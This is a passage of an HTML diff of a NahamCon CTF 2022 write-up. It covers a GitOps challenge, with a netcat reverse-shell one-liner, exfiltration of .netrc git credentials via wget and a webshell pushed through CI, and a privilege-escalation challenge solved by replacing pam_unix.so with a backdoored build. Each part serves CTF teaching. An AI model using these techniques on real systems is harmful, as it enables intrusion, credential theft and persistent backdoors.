       - rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;YOUR IP&gt; &lt;YOUR PORT&gt; &gt;/tmp/f
 </code></pre>
-    <p>
-     However, due to laziness doing this writeup and not bothering to turn on my attack infra I will just tell you the juicy details. When you check the
-     <code>
-      
+<p>
+ However, due to laziness doing this writeup and not bothering to turn on my attack infra I will just tell you the juicy details. When you check the
+ <code>
   $HOME
- 
-     </code>
-     directory on the Drone CI instance, you can see the
-     <code>
-      
+ </code>
+ directory on the Drone CI instance, you can see the
+ <code>
   git
- 
-     </code>
-     credentials in the file
-     <code>
-      
+ </code>
+ credentials in the file
+ <code>
   $HOME/.netrc
- 
-     </code>
-     . Below I just used the
-     <code>
-      
+ </code>
+ . Below I just used the
+ <code>
   wget
- 
-     </code>
-     to exfiltrate the contents of
-     <code>
-      
+ </code>
+ to exfiltrate the contents of
+ <code>
   $HOME/.netrc
- 
-     </code>
-     as
-     <code>
-      
+ </code>
+ as
+ <code>
   base64
- 
-     </code>
-     encoded text.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/gitops_gitingcreds.png"/>
-    </p>
-    <p>
-     Decoding the base64 text reveals that the
-     <code>
-      
+ </code>
+ encoded text.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/gitops_gitingcreds.png"/>
+</p>
+<p>
+ Decoding the base64 text reveals that the
+ <code>
   git
- 
-     </code>
-     credentials are
-     <strong>
-      <code>
-       
+ </code>
+ credentials are
+ <strong>
+  <code>
    droneci:t4K0@s!qSF
-  
-      </code>
-     </strong>
-     !
-    </p>
-    <p>
-     <em>
-      noice
-     </em>
-    </p>
-    <p>
-     So to finally push my
-     <code>
-      
+  </code>
+ </strong>
+ !
+</p>
+<p>
+ <em>
+  noice
+ </em>
+</p>
+<p>
+ So to finally push my
+ <code>
   webshell.php
- 
-     </code>
-     to the
-     <code>
-      
+ </code>
+ to the
+ <code>
   master
- 
-     </code>
-     branch I just needed to login as
-     <strong>
-      droneci
-     </strong>
-     and approve the changes then merge to
-     <code>
-      
+ </code>
+ branch I just needed to login as
+ <strong>
+  droneci
+ </strong>
+ and approve the changes then merge to
+ <code>
   master
- 
-     </code>
-     ! I also need to make sure that all of the
-     <strong>
-      continuous integration
-     </strong>
-     checks pass so I can successful push my webshell!
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/gitops_nosdl.png"/>
-    </p>
-    <p>
-     Once everything does, I had a nice webshell on the website! My personal favourite is the
-     <a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell">
-      WhiteWinterWolf PHP Webshell
-     </a>
-     !
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/gitops_noiceweebshell.png"/>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style5">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     Miscellaneous
-    </h1>
-   </div>
-  </div>
- </section>
- <section class="wrapper style6 alt">
-  <div class="inner">
-   <div class="content">
-    <h2 class="major">
-     Degradation
-    </h2>
-    <table>
-     <thead>
-      <tr>
-       <th>
-        Flag
-       </th>
-       <th>
-        Solves
-       </th>
-       <th>
-        Point Value
-       </th>
-      </tr>
-     </thead>
-     <tbody>
-      <tr>
-       <td>
-        flag{2d39ef6b9bc80c74405c443fc83c5772}
-       </td>
-       <td>
-        22
-       </td>
-       <td>
-        498
-       </td>
-      </tr>
-     </tbody>
-    </table>
-    <p>
-     So this challenge is a privilege escalation challenge to retrieve a flag from the
-     <code>
-      
+ </code>
+ ! I also need to make sure that all of the
+ <strong>
+  continuous integration
+ </strong>
+ checks pass so I can successful push my webshell!
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/gitops_nosdl.png"/>
+</p>
+<p>
+ Once everything does, I had a nice webshell on the website! My personal favourite is the
+ <a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell">
+  WhiteWinterWolf PHP Webshell
+ </a>
+ !
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/gitops_noiceweebshell.png"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style5 ">
+<div class="inner">
+<div class="content">
+
+<h1 class="major">
+ Miscellaneous
+</h1>
+</div>
+</div>
+</section>
+<section class="wrapper style6 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major">
+ Degradation
+</h2>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Flag
+   </th>
+   <th>
+    Solves
+   </th>
+   <th>
+    Point Value
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    flag{2d39ef6b9bc80c74405c443fc83c5772}
+   </td>
+   <td>
+    22
+   </td>
+   <td>
+    498
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ So this challenge is a privilege escalation challenge to retrieve a flag from the
+ <code>
   root
- 
-     </code>
-     directory.
-    </p>
-    <p>
-     After SSHing into the box, I did the standard checks to see if I can exploit an existing program for privilege escalation (eg.
-     <code>
-      
+ </code>
+ directory.
+</p>
+<p>
+ After SSHing into the box, I did the standard checks to see if I can exploit an existing program for privilege escalation (eg.
+ <code>
   sudo
- 
-     </code>
-     , sticky bit, crontab, running processes, etc). Nothing was useful until I check what files and folders the
-     <code>
-      
+ </code>
+ , sticky bit, crontab, running processes, etc). Nothing was useful until I check what files and folders the
+ <code>
   user
- 
-     </code>
-     has access to.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/degradation_nani.png"/>
-    </p>
-    <pre class="codehilite"><code>/usr/lib/x86_64-linux-gnu/security
+ </code>
+ has access to.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/degradation_nani.png"/>
+</p>
+<pre class="codehilite"><code>/usr/lib/x86_64-linux-gnu/security
 </code></pre>
-    <p>
-     <em>
-      That is so sus
-     </em>
-    </p>
-    <p>
-     Why is it bad for users to have file write on the
-     <code>
-      
+<p>
+ <em>
+  That is so sus
+ </em>
+</p>
+<p>
+ Why is it bad for users to have file write on the
+ <code>
   /usr/lib/x86_64-linux-gnu/security
- 
-     </code>
-     folder?
-    </p>
-    <p>
-     <strong>
-      It is because it is were the Pluggable Authentication Modules (PAM) libraries are stored!
-     </strong>
-    </p>
-    <p>
-     This means I could overwrite
-     <code>
-      
+ </code>
+ folder?
+</p>
+<p>
+ <strong>
+  It is because it is were the Pluggable Authentication Modules (PAM) libraries are stored!
+ </strong>
+</p>
+<p>
+ This means I could overwrite
+ <code>
   pam_unix.so
- 
-     </code>
-     which is the library for authenticating users on Unix and add a backdoor password so I can log in as the
-     <code>
-      
+ </code>
+ which is the library for authenticating users on Unix and add a backdoor password so I can log in as the
+ <code>
   root
- 
-     </code>
-     user!
-    </p>
-    <p>
-     There is an actually a tool for doing
-     <a href="https://github.com/zephrax/linux-pam-backdoor">
-      this located here
-     </a>
-     . How this
-     <code>
-      
+ </code>
+ user!
+</p>
+<p>
+ There is an actually a tool for doing
+ <a href="https://github.com/zephrax/linux-pam-backdoor">
+  this located here
+ </a>
+ . How this
+ <code>
   pam_unix.so
- 
-     </code>
-     backdoor works by patches the original source code with another password that you provide that it checks first before trying to authenticate the user with their original password. It then compiles the new
-     <code>
-      
+ </code>
+ backdoor works by patches the original source code with another password that you provide that it checks first before trying to authenticate the user with their original password. It then compiles the new
+ <code>
   pam_unix.so
- 
-     </code>
-     that you replace with the
-     <code>
-      
+ </code>
+ that you replace with the
+ <code>
   /usr/lib/x86_64-linux-gnu/security/pam_unix.so
- 
-     </code>
-     on the challenge instance.
-    </p>
-    <p>
-     I found that version 1.2.0 worked with creating the backdoor
-     <code>
-      
+ </code>
+ on the challenge instance.
+</p>
+<p>
+ I found that version 1.2.0 worked with creating the backdoor
+ <code>
   pam_unix.so
- 
-     </code>
-     and below I show how copied the
-     <code>
-      
+ </code>
+ and below I show how copied the
+ <code>
   pam_unix.so
- 
-     </code>
-     to the challenge instance and was able to login as
-     <code>
-      
+ </code>
+ to the challenge instance and was able to login as
+ <code>
   root
- 
-     </code>
-     (including me goofing a little).
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/degradation_flag.png"/>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style5">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     Conclusion
-    </h1>
-    <p>
-     NahamCon CTF 2022 has been my personal favourite CTF this year (so far)! Every challenge that I attempted was a tonne of fun and there was no annoying fluff that I see in most other CTF events.
-    </p>
-    <p>
-     <strong>
-      A huge congratulations and thank you for all of the challenge creators and organisers for running a brilliant CTF event!
-     </strong>
-    </p>
-   </div>
-  </div>
- </section>
+ </code>
+ (including me goofing a little).
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/degradation_flag.png"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style1 ">
+<div class="inner">
+<div class="content">
+
+<h1 class="major">
+ Conclusion
+</h1>
+<p>
+ NahamCon CTF 2022 has been my personal favourite CTF this year (so far)! Every challenge that I attempted was a tonne of fun and there was no annoying fluff that I see in most other CTF events.
+</p>
+<p>
+ <strong>
+  A huge congratulations and thank you for all of the challenge creators and organisers for running a brilliant CTF event!
+ </strong>
+</p></div>
+</div>
+</section>
 </section>
 
     	</div>
